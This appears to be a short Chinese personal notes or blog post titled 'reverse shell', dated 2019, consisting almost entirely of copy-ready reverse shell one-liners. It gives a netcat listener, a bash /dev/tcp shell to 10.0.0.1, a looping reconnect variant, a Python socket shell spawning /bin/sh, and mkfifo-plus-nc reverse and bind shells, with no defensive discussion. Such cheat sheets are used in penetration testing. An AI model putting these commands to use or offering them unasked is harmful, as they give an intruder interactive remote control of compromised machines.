title: 反弹shell
date: 2019-09-06
categories:
- 计算机
- 信息安全




---



nc做反弹shell
https://xz.aliyun.com/t/2549
https://www.freebuf.com/articles/system/10632.html

用这个接住：

```
$ nc -l -p 2333 -vvv
```

## Bash



```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

反复连接：

```
$ while true; do bash -i >& /dev/tcp/127.0.0.1/2333 0>&1; sleep 10; done
```

## Python

```
$ python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## NC

```
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f |/bin/sh -i 2>&1 |nc 10.0.0.1 2333 >/tmp/f

# 正向
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f |/bin/sh -i 2>&1 |nc -l -p 2333 >/tmp/f
```
